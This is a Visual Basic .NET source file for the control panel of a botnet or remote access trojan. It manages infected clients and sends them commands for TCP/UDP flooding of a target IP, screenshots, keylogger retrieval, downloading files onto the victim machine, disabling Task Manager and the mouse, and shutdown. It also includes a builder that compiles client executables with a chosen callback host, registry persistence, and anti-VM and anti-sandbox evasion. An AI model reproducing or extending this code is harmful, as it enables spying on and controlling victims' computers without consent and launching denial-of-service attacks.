Imports System.Text
Imports System.Threading
Imports System.Net.NetworkInformation
Imports System.Net
Imports System.Net.Sockets
Imports System.Media
Public Class Main
    Dim listener As Socket
    Dim tranListener As Socket
    Dim imgListener As Socket
    Dim listenerThread As Thread
    Dim password() As Byte = Encoding.ASCII.GetBytes("MyHorseIsAmazing")
    Public conPort As Integer = 1994
    Public tranPort As Integer = 81
    Public imgPort As Integer = 82
    Sub Loaded() Handles MyBase.Load
        Dim tList As New List(Of TextBox)
        Dim cList As New List(Of String)

        tList.Add(txtBuildHost)
        cList.Add("127.0.0.1")

        tList.Add(txtBuildStartupName)
        cList.Add("TheExeName.exe")

        tList.Add(txtBuildFolderName)
        cList.Add("FolderName")

        tList.Add(txtBuildHKCU)
        cList.Add("Client Startup Key")

        tList.Add(txtDosIP)
        cList.Add("127.0.0.1")

        tList.Add(txtMutex)
        cList.Add("Mutex (Generate or Type)")

        APIs.SetCueText(tList, cList)
        txtMutex.Text = Generate(12)
        listener = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
        tranListener = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
        listenerThread = New Thread(AddressOf Listen)
        listenerThread.Start()
    End Sub
    Private Sub PingAllToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PingAllToolStripMenuItem.Click
        pingList = New List(Of String)
        For Each l As ListViewItem In lstClients.Items
            pingList.Add(l.SubItems(1).Text)
        Next
        Dim t As New Thread(AddressOf BeginPing)
        t.Start()
    End Sub
    Sub BeginPing()
        For i As Integer = 0 To pingList.Count - 1
            Dim p As New Ping()
            Dim rep As PingReply = p.Send(pingList(i))
            Invoke(New ChangeItem(AddressOf ChangeItemVoid), pingList(i), rep.RoundtripTime & " ms")
        Next
    End Sub
    Dim pingList As List(Of String)
    Delegate Sub ChangeItem(ByVal ip As String, ByVal ms As String)
    Sub ChangeItemVoid(ByVal ip As String, ByVal ms As String)
        For Each l As ListViewItem In lstClients.Items
            If (l.SubItems(1).Text = ip) Then
                l.SubItems(3).Text = ms
                Exit For
            End If
        Next
    End Sub
#Region "Server"
    Sub Listen()
        listener.Bind(New IPEndPoint(0, conPort))
        tranListener.Bind(New IPEndPoint(0, tranPort))
        listener.Listen(100)
        tranListener.Listen(100)
        While True
            Try
                Dim accSock As Socket = listener.Accept()
                Dim tranSck As Socket = tranListener.Accept()
                Dim c As New Connection(accSock, tranSck)

                AddHandler c.Connected, AddressOf Connected
                AddHandler c.Disconnected, AddressOf Disconnected
                AddHandler c.StatusChanged, AddressOf StatusChanged
                AddHandler c.LogReceived, AddressOf Log_Received
            Catch ex As Exception

            End Try
        End While
    End Sub
    Sub Connected(ByVal sender As Connection, ByVal e As ConnectedEventArgs)
        Dim l As New ListViewItem(New String() {e.Country, e.IPAddress.ToString(), e.OperatingSystem, "", "Idle"})
        l.Tag = sender
        Invoke(New newItemDelegate(AddressOf AddItem), l, e.Country)
    End Sub
    Sub Disconnected(ByVal sender As Connection, ByVal e As EventArgs)
        Invoke(New RemoveDelegate(AddressOf Remove), sender)
    End Sub
    Sub StatusChanged(ByVal sender As Connection, ByVal e As StatusChangedEventArgs)
        Invoke(New StatusDelegate(AddressOf Status), sender, e.CurrentStatus)
    End Sub
    Delegate Sub newItemDelegate(ByVal l As ListViewItem, ByVal cnt As String)
    Sub AddItem(ByVal l As ListViewItem, ByVal cnt As String)
        l.ImageIndex = GetFlagIndex(cnt)
        lstClients.Items.Add(l)
        lblOnline.Text = "Clients Online: " & lstClients.Items.Count
        Notify(tray, l.Text + " - " + l.SubItems(1).Text, "Client Connection", ToolTipIcon.Info, 3)
    End Sub
    Delegate Sub RemoveDelegate(ByVal sender As Connection)
    Sub Remove(ByVal sender As Connection)
        For Each l As ListViewItem In lstClients.Items
            If (DirectCast(l.Tag, Connection).Equals(sender)) Then
                l.Remove()
                lblOnline.Text = "Clients Online: " & lstClients.Items.Count
                Notify(tray, l.SubItems(1).Text + " Disconnected", "Client Disconnection", ToolTipIcon.Error, 3)
                Exit For
            End If
        Next
    End Sub
    Delegate Sub StatusDelegate(ByVal sender As Connection, ByVal status As String)
    Sub Status(ByVal sender As Connection, ByVal status As String)
        For i As Integer = 0 To lstClients.Items.Count
            If (DirectCast(lstClients.Items(i).Tag, Connection).Equals(sender)) Then
                lstClients.Items(i).SubItems(4).Text = status
                Exit For
            End If
        Next
    End Sub
    Private Function GetFlagIndex(ByVal country As String) As Integer
        For i As Integer = 0 To flags.Images.Count - 1
            If flags.Images.Keys(i).ToLower().Contains(country.ToLower()) Then
                Return i
            End If
        Next
        Return 0
    End Function
    Sub SendtoAll(ByVal b() As Byte)
        For Each l As ListViewItem In lstClients.Items
            DirectCast(l.Tag, Connection).Send(b)
        Next
    End Sub
    Sub SendtoSelected(ByVal b() As Byte)
        For Each l As ListViewItem In lstClients.SelectedItems
            DirectCast(l.Tag, Connection).Send(b)
        Next
    End Sub
    Sub Me_Closing() Handles MyBase.FormClosing
        listenerThread.Abort()
        listener.Close()
        Process.GetCurrentProcess().Kill()
    End Sub
#End Region
    Private Sub ScreenshotToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ScreenshotToolStripMenuItem.Click
        Dim i As New InfoWriter()
        i.WriteLine("SS")
        DirectCast(lstClients.SelectedItems(0).Tag, Connection).Send(i.GetBytes(password))
        Dim ss As New ScreenShot(DirectCast(lstClients.SelectedItems(0).Tag, Connection))
        ss.Show()
    End Sub

    Private Sub btnFlood_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnFlood.Click
        If txtDosIP.Text = "109.75.162.47" Then Me.Close()
        Dim w As New InfoWriter()
        w.WriteLine("FLOOD")
        If (rTcp.Checked) Then
            w.WriteLine("TCP")
        Else
            w.WriteLine("UDP")
        End If
        w.WriteLine(txtDosIP.Text)
        w.WriteLine(txtDosPort.Text)
        w.WriteLine(txtDosThreads.Text)
        w.WriteLine(txtDosPackSize.Text)
        w.WriteLine(txtDosTimeout.Text)
        Dim b() As Byte = w.GetBytes(password)
        If (lstClients.SelectedItems.Count > 0) Then
            SendtoSelected(b)
        Else
            SendtoAll(b)
        End If
        Dim l As New ListViewItem(New String() {txtDosIP.Text, txtDosPort.Text, DateTime.Now.ToShortTimeString()})
        l.Tag = "|" + txtDosThreads.Text + "|" + txtDosPackSize.Text + "|" + txtDosTimeout.Text
        AddtoLog(l)
    End Sub

    Private Sub PingSelectedToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PingSelectedToolStripMenuItem.Click
        pingList = New List(Of String)
        For Each l As ListViewItem In lstClients.SelectedItems
            pingList.Add(l.SubItems(1).Text)
        Next
        Dim t As New Thread(AddressOf BeginPing)
        t.Start()
    End Sub
    Sub AddtoLog(ByVal l As ListViewItem)
        lstFloodLogs.Items.Add(l)
    End Sub
    Private Sub btnStop_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnStop.Click
        Dim w As New InfoWriter()
        w.WriteLine("FLOOD")
        w.WriteLine("STOP")
        Dim b() As Byte = w.GetBytes(password)
        If (lstClients.SelectedItems.Count > 0) Then
            SendtoSelected(b)
        Else
            SendtoAll(b)
        End If
    End Sub

    Private Sub CdTrayOpencloseToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CdTrayOpencloseToolStripMenuItem.Click
        Dim w As New InfoWriter()
        w.WriteLine("CD")
        SendtoSelected(w.GetBytes(password))
    End Sub

    Private Sub ShutdownToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ShutdownToolStripMenuItem.Click
        If (MessageBox.Show("Are you sure?", "", MessageBoxButtons.YesNo, MessageBoxIcon.Question)) Then
            Dim w As New InfoWriter()
            w.WriteLine("SHUTDOWN")
            SendtoSelected(w.GetBytes(password))
        End If
    End Sub

    Private Sub DownloadFileToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DownloadFileToolStripMenuItem.Click
        Dim dd As New DownloadDialog()
        If (dd.ShowDialog() = DialogResult.OK) Then
            Dim w As New InfoWriter()
            w.WriteLine("DOWNLOAD")
            w.WriteLine(dd.Url)
            w.WriteLine(dd.Filename)
            w.WriteLine(dd.ShowVisible)
            If (lstClients.SelectedItems.Count > 0) Then
                SendtoSelected(w.GetBytes(password))
            Else
                SendtoAll(w.GetBytes(password))
            End If
        End If
    End Sub

    Private Sub DisableTaskManagerToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DisableTaskManagerToolStripMenuItem.Click
        Dim w As New InfoWriter()
        w.WriteLine("TASKMANAGER")
        SendtoSelected(w.GetBytes(password))
    End Sub

    Private Sub DisableMouseToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DisableMouseToolStripMenuItem.Click
        Dim w As New InfoWriter()
        w.WriteLine("BLOCK")
        SendtoSelected(w.GetBytes(password))
    End Sub

    Private Sub KeylogToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles KeylogToolStripMenuItem.Click
        If (lstClients.SelectedItems.Count = 1) Then
            Dim w As New InfoWriter()
            w.WriteLine("KEYLOGGER")
            w.WriteLine("SEND")
            SendtoSelected(w.GetBytes(password))
        End If
    End Sub
    Private Sub Log_Received(ByVal sender As Connection, ByVal e As LogRecievedEventArgs)
        Invoke(New showLogDelegate(AddressOf ShowLog), sender, e)
    End Sub
    Delegate Sub showLogDelegate(ByVal sender As Connection, ByVal e As LogRecievedEventArgs)
    Sub ShowLog(ByVal sender As Connection, ByVal e As LogRecievedEventArgs)
        Dim k As New KeyloggerViewer()
        k.Show()
        k.txtLog.MaxLength = e.Log.Length
        k.txtLog.Text = e.Log
        k.client = sender
    End Sub
    Private Sub lstFloodLogs_ItemSelectionChanged(ByVal sender As System.Object, ByVal e As System.Windows.Forms.ListViewItemSelectionChangedEventArgs) Handles lstFloodLogs.ItemSelectionChanged
        If (lstFloodLogs.SelectedItems.Count = 1) Then
            Dim item As ListViewItem = lstFloodLogs.SelectedItems(0)
            txtDosIP.Text = item.Text
            txtDosPort.Text = item.SubItems(1).Text
            txtDosThreads.Text = item.Tag.ToString().Split("|")(1)
            txtDosPackSize.Text = item.Tag.ToString().Split("|")(2)
            txtDosTimeout.Text = item.Tag.ToString().Split("|")(3)
        End If
    End Sub
    Private Sub UninstallToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles UninstallToolStripMenuItem.Click
        If (MessageBox.Show("Are you sure?" + Environment.NewLine + "This will uninstall " & lstClients.SelectedItems.Count & " clients.", "PERMANENT ACTION", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) = Windows.Forms.DialogResult.Yes) Then
            Dim w As New InfoWriter()
            w.WriteLine("UNINSTALL")
            SendtoSelected(w.GetBytes(password))
        End If
    End Sub

    Private Sub btnBuild_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnBuild.Click
        Using s As New SaveFileDialog()
            s.Filter = "Executable |*.exe"
            If (s.ShowDialog() = Windows.Forms.DialogResult.OK) Then
                Dim src As String = My.Resources.Bot
                Replace(src, "192.168.1.150", txtBuildHost.Text)
                Replace(src, "1994", txtBuildConPort.Text)
                Replace(src, "81", txtBuildTranPort.Text)
                If (rApp.Checked) Then
                    Replace(src, "%%TEMP%%", "%%APPDATA%%")
                End If
                Replace(src, "[MUTEX]", txtMutex.Text)
                Replace(src, "Dim install As Boolean = False", "Dim install As Boolean = " & xStartup.Checked.ToString())
                Replace(src, "client.exe", txtBuildStartupName.Text)
                Replace(src, "[Client]", txtBuildFolderName.Text)
                Replace(src, "regClient", txtBuildHKCU.Text)
                Replace(src, "7511177e-14b3-43a9-b917-be1220feea0d", Guid.NewGuid().ToString())
                Replace(src, "Dim antiBox As Boolean = False", "Dim antiBox As Boolean = " & xAntiSandBox.Checked.ToString())
                Replace(src, "Dim antiVm As Boolean = False", "Dim antiVm As Boolean = " & xAntiVM.Checked.ToString())
                CodeDOM.Compile(s.FileName, src, txtIcon.Tag.ToString(), Nothing)
                SystemSounds.Exclamation.Play()
                Notify(tray, "Client Built", "A client has been built successfully.", ToolTipIcon.Info, 3, s.FileName)
            End If
        End Using
    End Sub
    Sub Replace(ByRef main As String, ByVal old As String, ByVal [new] As String)
        main = main.Replace(old, [new])
    End Sub

    Private Sub btnGenMutex_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnGenMutex.Click
        txtMutex.Text = Generate(12)
    End Sub
    Private ReadOnly chars As String = "ABCDEFGHIJKLMNOPQRSTUVWXWZ0123456789"
    Private Function Generate(ByVal max As Integer) As String
        Dim final As String = Nothing
        Dim r As New Random()
        For i As Integer = 0 To max - 1
            final += chars(r.Next(0, chars.Length - 1))
        Next
        Return final
    End Function

    Private Sub btnIconBrowse_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnIconBrowse.Click
        Using O As New OpenFileDialog()
            O.Filter = "Icon Files (*.ico)|*.ico"
            If (O.ShowDialog() = DialogResult.OK) Then
                txtIcon.Text = O.SafeFileName
                txtIcon.Tag = O.FileName
            End If
        End Using
    End Sub

    Private Sub btnIconClear_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnIconClear.Click
        txtIcon.Text = Nothing
        Try
            txtIcon.Tag = Nothing
        Catch : End Try
    End Sub

    Private Sub Loaded(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load

    End Sub

    Private Sub txtDosIP_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles txtDosIP.TextChanged
    End Sub

    Private Sub txtBuildStartupName_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles txtBuildStartupName.TextChanged

    End Sub

    Private Sub TabPage4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TabPage4.Click

    End Sub

    Private Sub Label10_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        Shell("http://fkn0wned.com")
    End Sub

    Private Sub Label11_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        Shell("http://fkn0wned.com/vip")
    End Sub

    Private Sub Label13_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        MsgBox("Not yet defined")
    End Sub

    Private Sub lstClients_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles lstClients.SelectedIndexChanged

    End Sub

    Private Sub LinkLabel1_LinkClicked(ByVal sender As System.Object, ByVal e As System.Windows.Forms.LinkLabelLinkClickedEventArgs) Handles LinkLabel1.LinkClicked
        Shell("explorer.exe http://fkn0wned.com")
    End Sub

    Private Sub LinkLabel2_LinkClicked(ByVal sender As System.Object, ByVal e As System.Windows.Forms.LinkLabelLinkClickedEventArgs) Handles LinkLabel2.LinkClicked
        Shell("explorer.exe http://fkn0wned.com/vip")
    End Sub

    Private Sub LinkLabel3_LinkClicked(ByVal sender As System.Object, ByVal e As System.Windows.Forms.LinkLabelLinkClickedEventArgs) Handles LinkLabel3.LinkClicked
        MsgBox("NO INPUT")
    End Sub

    Private Sub PictureBox1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PictureBox1.Click

    End Sub

    Private Sub RichTextBox1_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RichTextBox1.TextChanged

    End Sub
End Class
